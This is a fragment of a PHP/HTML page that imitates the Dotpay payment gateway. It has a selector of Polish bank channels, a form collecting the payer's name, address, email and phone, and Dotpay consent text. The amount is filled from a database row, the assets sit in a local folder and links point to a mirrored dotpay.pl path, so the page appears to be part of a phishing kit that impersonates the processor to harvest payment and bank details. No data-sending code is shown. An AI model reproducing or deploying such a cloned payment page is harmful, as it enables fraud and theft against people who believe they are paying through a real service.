				<td width="250" rowspan="2" style="text-align: right; vertical-align: top; padding-right: 15px;" class="big_text"><b>Kwota:</b> <span id="kwotas" class="bigger_text"><?php echo $rowsp['payment'];?> PLN</span><br><span id="gwarancja"></span></td>
			</tr>
			<tr>
				<td width="50" style="text-align: left; vertical-align: top; padding-left: 15px;" class="big_text"><b>Opis:</b></td>
				<td width="450" style="text-align: left; vertical-align: top;" class="big_text"><?php echo $rowsp['title'];?></td>
			</tr>
		</tbody></table>
		
		
		<div class="gray_pad" style="margin-top:10px;">
			<ul id="menu_top_l">
			<li class="left_m"><span class="b" style="font-size:12px;">Wybrany kanał płatności:</span></li>
			</ul>

		</div>
		
		<div style="width: 100%;">

                        <div style="margin-left: 12px; line-height: 20px;">
		
							<div class="channels_table row" style="width:100%;">

								<div class=" float-left">
									<div class="col-sm-12" id="style_all">
									<div class="col-sm-2" style="padding:10px;">
										<h4 style="font-size:13px;">Karty płatnicze</h4>
										<div class="invisible_radios channel not_highlighted  float-left" id="channel_245_cell" title="Karty kredytowe">
											<input type="radio" name="kanal" id="kanal50" onclick=" setCard();highlight(50); PPchosen(); chkcnl('kanal50');" value="50">
											<label for="kanal50">
												<img class="channel-image" src="files51351/CHANNEL_LOGO_245.png" alt="Karty kredytowe">
											</label>
					
										</div>											
				
										<div class="invisible_radios channel not_highlighted  float-left" id="channel_71_cell" title="MasterPass">
											<input type="radio" name="kanal" id="kanal71" onclick=" setCard();highlight(71); PPchosen(); chkcnl('kanal71');" value="71">
											<label for="kanal71">
												<img class="channel-image" src="files51351/CHANNEL_LOGO_71.png" alt="MasterPass">
											</label>
											
										</div>											
									</div>
									<div class="col-sm-10 border-left float-left" style="padding:10px;">
										<h4 style="font-size:13px;">Szybkie transfery</h4>
										<div class="invisible_radios channel not_highlighted  float-left" id="channel_1_cell" title="mTransfer">
											<input type="radio" name="kanal" id="kanal1" onclick="show_bank(this.value); highlight(1); PPchosen(); chkcnl('kanal1');" value="mBank">
											<label for="kanal1">
												<img class="channel-image" src="files51351/CHANNEL_LOGO_1.png" alt="mTransfer">
											</label>
											
										</div>											
				
									<div class="invisible_radios channel not_highlighted  float-left" id="channel_2_cell" title="Płacę z Inteligo">
										<input type="radio" name="kanal" id="kanal2" onclick="show_bank(this.value); highlight(2); PPchosen(); chkcnl('kanal2');" value="Płacę z Inteligo">
										<label for="kanal2">
											<img class="channel-image" src="files51351/CHANNEL_LOGO_2.png" alt="Płacę z Inteligo">
										</label>
										
									</div>																					
				
									<div class="invisible_radios channel not_highlighted  float-left" id="channel_4_cell" title="Płacę z iPKO">
										<input type="radio" name="kanal" id="kanal4" onclick="show_bank(this.value);highlight(4); PPchosen(); chkcnl('kanal4');" value="IPKO">
										<label for="kanal4">
											<img class="channel-image" src="files51351/channel_4_pl-140x70.png" alt="Płacę z iPKO">
										</label>
										
									</div>											

				
									<div class="invisible_radios channel not_highlighted  float-left" id="channel_46_cell" title="Płacę z Citi Handlowy">
										<input type="radio" name="kanal" id="kanal46" onclick="show_bank(this.value); highlight(46); PPchosen(); chkcnl('kanal46');" value="Płacę z Citi Handlowy">
										<label for="kanal46">
											<img class="channel-image" src="files51351/CHANNEL_LOGO_46.png" alt="Płacę z Citi Handlowy">
										</label>
										
									</div>	
									<div class="invisible_radios channel not_highlighted  float-left" id="channel_6_cell" title="Przelew24">
										<input type="radio" name="kanal" id="kanal6" onclick="show_bank(this.value); highlight(6); PPchosen(); chkcnl('kanal6');" value="Przelew24">
										<label for="kanal6">
											<img class="channel-image" src="files51351/CHANNEL_LOGO_6.png" alt="Przelew24">
										</label>
										
									</div>	
																
									
									<div class="invisible_radios channel not_highlighted  float-left" id="channel_36_cell" title="Pekao24Przelew">
										<input type="radio" name="kanal" id="kanal36" onclick="show_bank(this.value);highlight(36); PPchosen(); chkcnl('kanal36');" value="Pekao24Przelew">
										<label for="kanal36">
											<img class="channel-image" src="files51351/CHANNEL_LOGO_36.png" alt="Pekao24Przelew">
										</label>
										
									</div>											
									
									<div class="invisible_radios channel not_highlighted  float-left" id="channel_38_cell" title="Płać z ING">
										<input type="radio" name="kanal" id="kanal38" onclick="show_bank(this.value); highlight(38); PPchosen(); chkcnl('kanal38');" value="Płać z ING">
										<label for="kanal38">
											<img class="channel-image" src="files51351/CHANNEL_LOGO_38.png" alt="Płać z ING">
										</label>
										
									</div>											
									
									<div class="invisible_radios channel not_highlighted  float-left" id="channel_44_cell" title="Millennium">
										<input type="radio" name="kanal" id="kanal44" onclick="show_bank(this.value); highlight(44); PPchosen(); chkcnl('kanal44');" value="Millennium">
										<label for="kanal44">
											<img class="channel-image" src="files51351/CHANNEL_LOGO_44.png" alt="Millennium">
										</label>
										
									</div>
									
									<div class="invisible_radios channel not_highlighted  float-left" id="channel_18_cell" title="Płacę z Alior Bankiem">
										<input type="radio" name="kanal" id="kanal18" onclick="show_bank(this.value); highlight(18); PPchosen(); chkcnl('kanal18');" value="Bank alior">
										<label for="kanal18">
											<img class="channel-image" src="files51351/CHANNEL_LOGO_45.png" alt="Płacę z Alior Bankiem">
										</label>
									</div>											
		
			
									<div class="invisible_radios channel not_highlighted  float-left" id="channel_50_cell" title="Pay Way Toyota Bank">
										<input type="radio" name="kanal" id="kanal50" onclick="show_bank(this.value); highlight(50); PPchosen(); chkcnl('kanal50');" value="Pay Way Toyota Bank">
										<label for="kanal50">
											<img class="channel-image" src="files51351/CHANNEL_LOGO_50.png" alt="Pay Way Toyota Bank">
										</label>
										
									</div>											
				
									<div class="invisible_radios channel not_highlighted  float-left" id="channel_51_cell" title="Płać z BOŚ">
										<input type="radio" name="kanal" id="kanal51" onclick="show_bank(this.value); highlight(51); PPchosen(); chkcnl('kanal51');" value="Płać z BOŚ">
										<label for="kanal51">
											<img class="channel-image" src="files51351/CHANNEL_LOGO_51.png" alt="Płać z BOŚ">
										</label>
										
									</div>											
				
									<div class="invisible_radios channel not_highlighted  float-left" id="channel_56_cell" title="eurobank - płatność online">
										<input type="radio" name="kanal" id="kanal56" onclick="show_bank(this.value); highlight(56); PPchosen(); chkcnl('kanal56');" value="eurobank - płatność online">
										<label for="kanal56">
											<img class="channel-image" src="files51351/CHANNEL_LOGO_56.png" alt="eurobank - płatność online">
										</label>
										
									</div>											
									
									<div class="invisible_radios channel not_highlighted  float-left" id="channel_58_cell" title="Szybkie Płatności Internetowe z Deutsche Bank PBC">
										<input type="radio" name="kanal" id="kanal58" onclick="show_bank(this.value); highlight(58); PPchosen(); chkcnl('kanal58');" value="Szybkie Płatności Internetowe z Deutsche Bank PBC">
										<label for="kanal58">
											<img class="channel-image" src="files51351/CHANNEL_LOGO_58.png" alt="Szybkie Płatności Internetowe z Deutsche Bank PBC">
										</label>
										
									</div>											
									
									<div class="invisible_radios channel not_highlighted  float-left" id="channel_60_cell" title="Płacę z T-Mobile Usługi Bankowe">
										<input type="radio" name="kanal" id="kanal60" onclick="show_bank(this.value); highlight(60); PPchosen(); chkcnl('kanal60');" value="Płacę z T-Mobile Usługi Bankowe">
										<label for="kanal60">
											<img class="channel-image" src="files51351/CHANNEL_LOGO_60.png" alt="Płacę z T-Mobile Usługi Bankowe">
										</label>
										
									</div>	
										
									
									<div class="invisible_radios channel not_highlighted  float-left" id="channel_70_cell" title="Pocztowy24">
										<input type="radio" name="kanal" id="kanal70" onclick="show_bank(this.value); highlight(70); PPchosen(); chkcnl('kanal70');" value="Pocztowy24">
										<label for="kanal70">
											<img class="channel-image" src="files51351/CHANNEL_LOGO_70.png" alt="Pocztowy24">
										</label>
										
									</div>											
									
									<div class="invisible_radios channel not_highlighted  float-left" id="channel_72_cell" title="Płacę z Orange">
										<input type="radio" name="kanal" id="kanal72" onclick="show_bank(this.value); highlight(72); PPchosen(); chkcnl('kanal72');" value="72">
										<label for="kanal72">
											<img class="channel-image" src="files51351/CHANNEL_LOGO_72.png" alt="Płacę z Orange">
										</label>
										
									</div>											
									
									<div class="invisible_radios channel not_highlighted  float-left" id="channel_74_cell" title="Banki Spółdzielcze">
										<input type="radio" name="kanal" id="kanal74" onclick="show_bank(this.value);highlight(74); PPchosen(); chkcnl('kanal74');" value="74">
										<label for="kanal74">
											<img class="channel-image" src="files51351/CHANNEL_LOGO_74.png" alt="Banki Spółdzielcze">
										</label>
										
									</div>											
									
									<div class="invisible_radios channel not_highlighted  float-left" id="channel_75_cell" title="Płacę z Plus Bank">
										<input type="radio" name="kanal" id="kanal75" onclick="show_bank(this.value);highlight(75); PPchosen(); chkcnl('kanal75');" value="75">
										<label for="kanal75">
											<img class="channel-image" src="files51351/CHANNEL_LOGO_75.png" alt="Płacę z Plus Bank">
										</label>
										
									</div>											
									
									<div class="invisible_radios channel not_highlighted  float-left" id="channel_76_cell" title="Getin Bank PBL">
										<input type="radio" name="kanal" id="kanal76" onclick="show_bank(this.value);highlight(76); PPchosen(); chkcnl('kanal76');" value="Getin Bank PBL">
										<label for="kanal76">
											<img class="channel-image" src="files51351/CHANNEL_LOGO_76.png" alt="Getin Bank PBL">
										</label>
										
									</div>											
									
									<div class="invisible_radios channel not_highlighted  float-left" id="channel_81_cell" title="Idea Cloud">
										<input type="radio" name="kanal" id="kanal81" onclick="show_bank(this.value);highlight(81); PPchosen(); chkcnl('kanal81');" value="81">
										<label for="kanal81">
											<img class="channel-image" src="files51351/CHANNEL_LOGO_81.png" alt="Idea Cloud">
										</label>
										
									</div>											
									
									<div class="invisible_radios channel not_highlighted  float-left" id="channel_65_cell" title="Płacę z Idea Bank">
										<input type="radio" name="kanal" id="kanal65" onclick="show_bank(this.value);highlight(65); PPchosen(); chkcnl('kanal65');" value="65">
										<label for="kanal65">
											<img class="channel-image" src="files51351/CHANNEL_LOGO_65.png" alt="Płacę z Idea Bank">
										</label>
									</div>
									
									<div class="invisible_radios channel not_highlighted  float-left" id="channel_16_cell" title="Credit Agricole">
										<input type="radio" name="kanal" id="kanal16" onclick="show_bank(this.value); highlight(16); PPchosen(); chkcnl('kanal16');" value="Credit Agricole">
										<label for="kanal16">
											<img class="channel-image" src="files51351/CHANNEL_LOGO_16.png" alt="Credit Agricole">
										</label>
									</div>
									
									<div class="invisible_radios channel not_highlighted  float-left" id="channel_17_cell" title="Moj">
										<input type="radio" name="kanal" id="kanal17" onclick="show_bank(this.value); highlight(17); PPchosen(); chkcnl('kanal17');" value="Moj">
										<label for="kanal17">
											<img class="channel-image" src="files51351/CHANNEL_LOGO_12.png" alt="Moj">
										</label>
									</div>
									
										
									</div>
									</div></div></div>
									
									<div class="row" style="width:100%;">
									
									<div class="col-sm-12"><h4>Przelewy online</h4>										
									
										<div class="invisible_radios channel not_highlighted  float-left" id="channel_32_cell"  title="BNP Paribas">
											<input type="radio" name="kanal" id="kanal32" onclick="show_bank(this.value);highlight(32); PPchosen(); chkcnl('kanal32');" value="BNP Paribas">
											<label for="kanal32">
												<img class="channel-image" src="files51351/CHANNEL_LOGO_32.png" alt="BNP Paribas">
											</label>
											
										</div>											
										
										<div class="invisible_radios channel not_highlighted  float-left" id="channel_33_cell" title="Volkswagen Bank">
											<input type="radio" name="kanal" id="kanal33" onclick="show_bank(this.value);highlight(33); PPchosen(); chkcnl('kanal33');" value="33">
											<label for="kanal33">
												<img class="channel-image" src="files51351/CHANNEL_LOGO_33.png" alt="Volkswagen Bank">
											</label>
											
										</div>											
										
										<div class="invisible_radios channel not_highlighted  float-left" id="channel_43_cell" title="Bank Spółdzielczy we Wschowie">
											<input type="radio" name="kanal" id="kanal43" onclick="show_bank(this.value);highlight(43); PPchosen(); chkcnl('kanal43');" value="43">
											<label for="kanal43">
												<img class="channel-image" src="files51351/CHANNEL_LOGO_43.png" alt="Bank Spółdzielczy we Wschowie">
											</label>
										</div>  
									</div>  
									</div>
					
							
						<div >
							<div id="mpay_opis" style="margin: 10px auto; padding: 0 20px; display: none; font-weight: bold;">W chwili obecnej płatność za pomocą telefonu komórkowego jest dostępna<br>dla użytkowników sieci komórkowych Plus, Play, T-mobile, Orange i innych polskich sieci komórkowych.</div>
						</div>
					
					
					<div style=" background-color: #F3F3F3;height:25px;font-size:11px;" >
						<span style="font-weight: bold;margin-left:10px;" id="payerDetailsDescription">Informacja o posiadaczu konta</span>
					</div>

					
				<div id="style_width_header" align="center">

						<form action="" method="post">

						<div id="style_table">

								<div class="col-sm-12 margin1">
									<div class="col-sm-6">
										<div class="col-sm-3" style="text-align:left;">
											<span id="idd">Imię:</span>
										</div>
										<div class="col-sm-3 " style="text-align:left;">
											<input name="first_name" size="13" value="" maxlength="25"  required="" class="inputf">
										</div>
									</div>
									<div class="col-sm-6 ">
										<div class="col-sm-3" style="text-align:left;">
											<span id="pwdid">Nazwisko:</span>
										</div>
										<div class="col-sm-3" style="text-align:left;">
											<span id="surpass"><input name="last_name" maxlength="25" size="23" value="" required="" class="inputf"></span>
										</div>
									</div>
								 </div>
								 
								<div class="col-sm-12 margin1" style="text-align:left;">
									<span colspan="7" class="adr" style='margin-left:30px;'> Adres posiadacza karty podany we wniosku o wydanie karty</span>
								</div>
								
								
								<div class="col-sm-12 margin1" style="text-align:left;">
									<div class="col-sm-6">
										<div class="col-sm-3" style="text-align:left;">
										<span class="teksttab">Ulica:</span>
										</div>
										<div class="col-sm-3" style="text-align:left;">
										<input type="hidden" name="cardSet" id="cardSet">
										<input name="street" size="32" value=""  class="inputf" readonly=""></div>
									</div>
									
									<div class="col-sm-6">
										
										<div class="col-sm-3" style="text-align:left;">
											<span class="teksttab">Nr budynku:</span>
										</div>

										<div class="col-sm-3" style="text-align:left;">
											<input name="building_number" size="7" value="" class="inputf" readonly="">
										</div>
										
										<p id="look">
										<td style="text-align: left">/Nr lokalu:
										<input name="premise_number" size="7"  value="" class="inputf" readonly=""></td>
										</p>

									</div>
								</div>
								
								
								<div class="col-sm-12 margin1" style="text-align:left;">
									<div class="col-sm-6">
										<div class="col-sm-3" style="text-align:left;">
											<span class="teksttab" style="font-size:10px;">Kod pocztowy:</span>
										</div>
										<div class="col-sm-3" style="text-align:left;">
											<input size="6" name="postal_code"  value="" class="inputf" readonly="">
										</div>
									</div>
									<div class="col-sm-6">
										<div class="col-sm-3" style="text-align:left;">
											<span class="teksttab">Miasto:</span>
											</div>
										<div class="col-sm-3" style="text-align:left;">
											<input name="city" size="23"  value="" class="inputf" readonly="">
										</div>
									</div>
								</div>
								
								<div class="col-sm-12 margin1" style="text-align:left;">
									<div class="col-sm-6">
										<div class="col-sm-3" style="text-align:left;">
										 <span class="teksttab">Email:</span>
										</div>
										<div class="col-sm-3" style="text-align:left;">
											<input size="32" type="email" name="email" value=""  class="inputf" id="email">
										</div>
									</div>
									<div class="col-sm-6">
										<div class="col-sm-3" style="text-align:left;">
											<span class="teksttab">Telefon:</span>
										</div>
										<div class="col-sm-3" style="text-align:left;">
											<input name="telepone" size="23" value="" readonly="" class="inputf">
										</div>
									</div>
								</div>

								<div class="col-sm-12 margin1" style="text-align:left;">
									<div class="col-sm-6">
									</div>
									
									<div class="col-sm-6">
										<div class="col-sm-3" style="text-align:left;">
											<span class="teksttab">Kraj:</span>
										</div>
										<div class="col-sm-3" style="text-align:left;">
											<select class="forms" name="country" onchange="WybierzRegion(this)">
											<option value="">------</option>
											<option value="ALB">Albania</option>
											<option value="DZA">Algeria</option>
											<option value="AND">Andorra</option>
											<option value="AIA">Anguilla</option>
											<option value="ATG">Antigua</option>
											<option value="ARG">Argentina</option>
											<option value="ARM">Armenia</option>
											<option value="ABW">Aruba</option>
											<option value="AUS">Australia</option>
											<option value="AUT">Austria</option>
											<option value="AZE">Azerbaijan</option>
											<option value="BHS">Bahamas</option>
											<option value="BHR">Bahrain</option>
											<option value="BGD">Bangladesh</option>
											<option value="BRB">Barbados</option>
											<option value="BLR">Belarus</option>
											<option value="BEL">Belgium</option>
											<option value="BLZ">Belize</option>
											<option value="BMU">Bermuda</option>
											<option value="BOL">Bolivia</option>
											<option value="BIH">Bosne and Herzegovina</option>
											<option value="BWA">Botswana</option>
											<option value="BRA">Brazil</option>
											<option value="SLB">British Solomon Islands</option>
											<option value="VGB">British Virgin Islands</option>
											<option value="BRN">Brunei</option>
											<option value="BGR">Bulgaria</option>
											<option value="CAN">Canada</option>
											<option value="CPV">Cape Verde</option>
											<option value="CYM">Cayman Islands</option>
											<option value="CHL">Chile</option>
											<option value="CHN">China</option>
											<option value="COL">Colombia</option>
											<option value="CRI">Costa Rica</option>
											<option value="HRV">Croatia</option>
											<option value="CYP">Cyprus</option>
											<option value="CZE">Czech Republic</option>
											<option value="DNK">Denmark</option>
											<option value="DMA">Dominica</option>
											<option value="DOM">Dominican Republic</option>
											<option value="ECU">Ecuador</option>
											<option value="EGY">Egypt</option>
											<option value="SLV">El Salvador</option>
											<option value="EST">Estonia</option>
											<option value="FJI">Fiji</option>
											<option value="FIN">Finland</option>
											<option value="FRA">France</option>
											<option value="PYF">French Polynesia</option>
											<option value="GEO">Georgia</option>
											<option value="DEU">Germany</option>
											<option value="GHA">Ghana</option>
											<option value="GRC">Greece</option>
											<option value="GRL">Greenland</option>
											<option value="GUM">Guam</option>
											<option value="GTM">Guatemal</option>
											<option value="GUY">Guyana</option>
											<option value="HTI">Haiti</option>
											<option value="HND">Honduras</option>
											<option value="HKG">Hong-Kong</option>
											<option value="HUN">Hungary</option>
											<option value="ISL">Iceland</option>
											<option value="IND">India</option>
											<option value="IDN">Indonesia</option>
											<option value="IRN">Iran</option>
											<option value="IRQ">Iraq</option>
											<option value="IRL">Ireland</option>
											<option value="IMN">Isle of Man</option>
											<option value="ISR">Israel</option>
											<option value="ITA">Italy</option>
											<option value="JAM">Jamaica</option>
											<option value="JPN">Japan</option>
											<option value="JOR">Jordan</option>
											<option value="KAZ">Kazakhstan</option>
											<option value="KEN">Kenya</option>
											<option value="KOR">Korea</option>
											<option value="KWT">Kuwait</option>
											<option value="LVA">Latvia</option>
											<option value="LBN">Lebanon</option>
											<option value="LBY">Libia</option>
											<option value="LTU">Lithuania</option>
											<option value="LUX">Luxembourg</option>
											<option value="MAC">Macau</option>
											<option value="MKD">Macedonia</option>
											<option value="MDG">Madagascar</option>
											<option value="MYS">Malaysia</option>
											<option value="MLT">Malta</option>
											<option value="MUS">Mauritius</option>
											<option value="MEX">Mexico</option>
											<option value="MDA">Moldova</option>
											<option value="MNG">Mongolia</option>
											<option value="MNE">Montenegro</option>
											<option value="MAR">Morocco</option>
											<option value="MOZ">Mozambique</option>
											<option value="NAM">Namibia</option>
											<option value="NPL">Nepal</option>
											<option value="NDL">Netherlands</option>
											<option value="ANT">Netherlands Antiles</option>
											<option value="NZL">New Zealand</option>
											<option value="NIC">Nicaragua</option>
											<option value="NGA">Nigeria</option>
											<option value="NOR">Norway</option>
											<option value="OMN">Oman</option>
											<option value="PAK">Pakistan</option>
											<option value="PAN">Panama</option>
											<option value="PNG">Papua New Guinea</option>
											<option value="PRY">Paraguay</option>
											<option value="PER">Peru</option>
											<option value="PHL">Philippines</option>
											<option value="POL" selected="">Polska</option>
											<option value="PRT">Portugal</option>
											<option value="QAT">Qatar</option>
											<option value="AGO">Republic of Angola</option>
											<option value="CIV">Republic of Côte d'Ivoire</option>
											<option value="SC">Republic of Seychelles</option>
											<option value="MHL">Republic of the Marshall Islands</option>
											<option value="ROM">Romania</option>
											<option value="RUS">Russia</option>
											<option value="WSM">Samoa</option>
											<option value="SAU">Saudi Arabia</option>
											<option value="SEN">Senegal</option>
											<option value="SRB">Serbia</option>
											<option value="SYC">Seychelles</option>
											<option value="SLE">Sierra Leone</option>
											<option value="SGP">Singapore</option>
											<option value="SVK">Slovakia</option>
											<option value="SVN">Slovenia</option>
											<option value="ZAF">South Africa</option>
											<option value="ESP">Spain</option>
											<option value="LKA">Sri Lanka</option>
											<option value="KNA">St.Kitts-Nevis-Anguilla</option>
											<option value="LCA">St.Lucia</option>
											<option value="SAN">St.Martin</option>
											<option value="VCT">St.Vincent</option>
											<option value="SUR">Suriname</option>
											<option value="SWE">Sweden</option>
											<option value="CHE">Switzerland</option>
											<option value="SYR">Syrian Arab Republic</option>
											<option value="TWN">Taiwan</option>
											<option value="THA">Thailand</option>
											<option value="TON">Tonga</option>
											<option value="TTO">Trinidad And Tobago</option>
											<option value="TUN">Tunisia</option>
											<option value="TUR">Turkey</option>
											<option value="TCA">Turks And Caicos Island</option>
											<option value="UKR">Ukrainian</option>
											<option value="ARE">United Arab Emirates</option>
											<option value="GBR">United Kingdom</option>
											<option value="USA">United States Of America</option>
											<option value="URY">Uruguay</option>
											<option value="UZB">Uzbekistan</option>
											<option value="VEN">Venezuela</option>
											<option value="VNM">Vietnam</option>
											<option value="ZWE">Zimbabwe</option>
											</select>
											<div id="sregion" style="display: none; margin-top: 10px;">State: <select class="forms" id="addr2" name="addr2"></select>
										</div>
										</div>
									 </div>
									</div>
		
								</div>
				 
				 
				 <table style="width: 90%; margin: 25px auto 5px auto; border: 1px solid #dfdfdf; border-collapse: collapse;" id="ramka_zgoda1">
					<tbody>
						<tr>
						<td style="width: 70px; padding-top: 5px; vertical-align: middle; text-align: center">
							<input required="" type="checkbox" name="zgoda1" value="1" checked="checked" id="zgoda1">
						</td>
						<td style="text-align: left; vertical-align: middle;"><div><label for="zgoda1"><a style="font-family: Tahoma, sans; font-size: 10px;" href="files51351/regulamin.pdf" target="_blank">Akceptuję Regulamin dokonywania wpłat w Dotpay</a></label></div></td>
						</tr>
					</tbody>
				 </table>

				 <table style="width: 90%; margin: 10px auto 5px auto; border: 1px solid #dfdfdf; border-collapse: collapse;" id="ramka_zgoda2">
				   <tbody><tr>
					<td style="width: 70px; padding-top: 5px; vertical-align: middle; text-align: center">
						<input required="" type="checkbox" name="zgoda2" value="1" checked="checked" id="zgoda2">
					</td>
					<td style="text-align: left;">
						<label for="zgoda2">Wyrażam zgodę na przetwarzanie moich danych osobowych przez Dotpay S.A. (Wielicka 72, Kraków) dla potrzeb realizacji procesu płatności zgodnie z obowiązującymi przepisami  (Ustawa z dnia 29.08.1997r. o ochronie danych osobowych, Dz. U. nr 133, poz. 883 z późn. zmianami).  Mam prawo wglądu i poprawiania swoich danych.</label>
					</td>
				  </tr>
				 </tbody></table>

				 <table style="width: 90%; margin: 10px auto 5px auto; border: 1px solid #dfdfdf; border-collapse: collapse;" id="ramka_zgoda_newsletter">
				   <tbody><tr>
					<td style="width: 70px; padding-top: 5px; vertical-align: middle; text-align: center">
						<input type="checkbox" name="zgoda_newsletter" value="1" id="zgoda_newsletter">
					</td>
					<td style="text-align: left;">
						<label for="zgoda_newsletter">Wyrażam zgodę na przetwarzanie moich danych osobowych przez Dotpay S.A.  (Wielicka 72, Kraków, dalej: "Dotpay")  w celach marketingowych Dotpay i jej partnerów biznesowych oraz na otrzymywanie od Dotpay informacji handlowych Dotpay i jej partnerów na podany przeze mnie adres email. Dane nie będą udostępniane podmiotom innym niż upoważnione na podstawie przepisów prawa. Podanie danych jest dobrowolne. Mam prawo wglądu i poprawiania swoich danych.</label>
					</td>
				  </tr>
				 </tbody></table>


				 <table style="width: 90%; margin: 10px auto 5px auto; border: 1px solid #dfdfdf; border-collapse: collapse;" id="ramka_zgoda_newsletter">
				   <tbody><tr>
					<td style="width: 70px; padding-top: 5px; vertical-align: middle; text-align: center">
					</td>
					<td style="text-align: left;">
						<a href="../www.dotpay.pl/polityka-plikow-cookies/index.html" target="_blank">Polityka cookies.</a>
					</td>
				  </tr>
				 </tbody></table>

						
						
					</div>
		
		
							
				</div></div>
				<br>
				<div id="subzaplata">Proszę czekać ...</div>
					<table border="0" cellpadding="8" cellspacing="0" width="100%">
						<tbody>
						<tr>
							<td style="text-align: center">


														<input class="redbutton" type="submit" name="submit" value="Dokonaj płatności"></td>                        
												</tr>
												</form>
				
								
        <tr><td class="tekstmaly" style="text-align: center">Copyright © 2001-2017 by <a href="index.html" target="_blank">dotpay</a></td></tr>
    </tbody></table>
    
    


	<div id="loga3d">
		<table style="margin:auto;">
			<tbody><tr>
				<td>
					<img src="files51351/visa.gif">
				</td>
				<td><img src="files51351/MC.gif"></td>
				<td><img src="files51351/jcb.gif"></td>
			</tr>
		</tbody></table>
	</div>

	</div>
</div>


</div></body></html>

<?php }  ?>
